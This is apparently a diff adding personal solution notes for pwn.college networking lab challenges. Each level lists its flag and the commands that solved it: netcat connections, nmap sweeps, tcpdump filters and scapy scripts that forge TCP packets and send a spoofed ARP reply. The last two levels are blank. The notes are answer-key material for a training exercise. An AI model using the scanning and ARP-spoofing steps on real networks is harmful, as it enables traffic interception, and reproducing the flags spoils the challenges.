@@ -1,0 +1,64 @@
+1. pwn.college{s2AAXcDsJzNW1MugoAHjE2dZXKh.0VO1MzMsITNxUzW}
+nc 10.0.0.3 31337
+
+2. pwn.college{wqK4WDdc0cDRmPz57NzmvspP73W.0FM2MzMsITNxUzW}
+nc -lvnp 31337 -s 10.0.0.2
+
+3. pwn.college{06rF6ob6fLfowGuKsCZERdToog6.0VM2MzMsITNxUzW}
+nmap -sn 10.0.0.0/24
+nc 10.0.0.37 31337
+
+4. pwn.college{Q64wTWu5jIHK4D2sB7fwBaVsNnU.0lM2MzMsITNxUzW}
+nmap -sn 10.0.0.0/16 --min-rate 5000
+nc 10.0.207.197 31337
+
+5. pwn.college{ANpUXIOn9X-J4cPjE0Fsavy04Rq.01M2MzMsITNxUzW}
+tcpdump -X port 31337 and '(tcp-syn|tcp-ack)!=0'
+
+6. pwn.college{s26bWpOTZx2XfkepW9gYj8qphJt.0FN2MzMsITNxUzW}
+tcpdump "(tcp[13] & 8 != 0) and (src 10.0.0.3) and (port 31337)" -i eth0 -X
+
+7. pwn.college{E2ipuovHTiBf1rPTvpsO-VoeRLc.0VN2MzMsITNxUzW}
+ip address add 10.0.0.2/16 dev eth0
+tcpdump -X
+nc -l 31337
+
+8. pwn.college{gahrh229tT-XaYeH56JZpux9_VU.0lN2MzMsITNxUzW}
+ip a -> get src mac address
+scapy
+>>> frame= Ether(src='c6:b3:fd:6c:9d:71', type=0xffff, iface='eth0')
+>>> sendp(frame, iface='eth0')
+
+9. pwn.college{gonNSYSWqCM4LGuCs4d_mDSTuOL.01N2MzMsITNxUzW}
+ip a -> get src mac address
+scapy
+>>> frame = Ether(src='42:29:e3:47:cc:17')/IP(src='10.0.0.2', dst='10.0.0.3', proto=0xff)
+>>> sendp(frame, iface='eth0')
+
+10. pwn.college{MW-mXG7afDgIbv6bYifYgMpzyKg.0FO2MzMsITNxUzW}
+ip a -> get src mac address
+scapy
+>>> frame = Ether(src='ca:47:9e:de:45:e6')/IP(src='10.0.0.2', dst='10.0.0.3')/TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags='APRSF')
+>>> sendp(frame, iface='eth0')
+
+11. pwn.college{0nJS2ad7sue9xCZhQLElkpfTjnr.0VO2MzMsITNxUzW}
+from scapy.all import *
+
+frame = Ether(src=get_if_hwaddr("eth0"))/IP(src='10.0.0.2', dst='10.0.0.3')/TCP(sport=31337, dport=31337, seq=31337, flags='S')
+sa, unk = srp(frame, iface="eth0")
+query, answer = sa[0]
+print(answer.seq)
+ans = Ether(src=get_if_hwaddr("eth0"))/IP(src='10.0.0.2', dst='10.0.0.3')/TCP(sport=31337, dport=31337, seq=31338, ack=(answer.seq+1), flags='A')
+sendp(ans, iface='eth0')
+
+12. pwn.college{A9pTdxQ_7JePvZjlsk54w4mbXPR.0FM3MzMsITNxUzW}
+from scapy.all import *
+
+frame = Ether(src=get_if_hwaddr("eth0"))/ARP(hwsrc=get_if_hwaddr("eth0"),op='is-at', psrc='10.0.0.2', pdst='10.0.0.3')
+sendp(frame, iface='eth0')
+
+13.
+
+14.
+
+
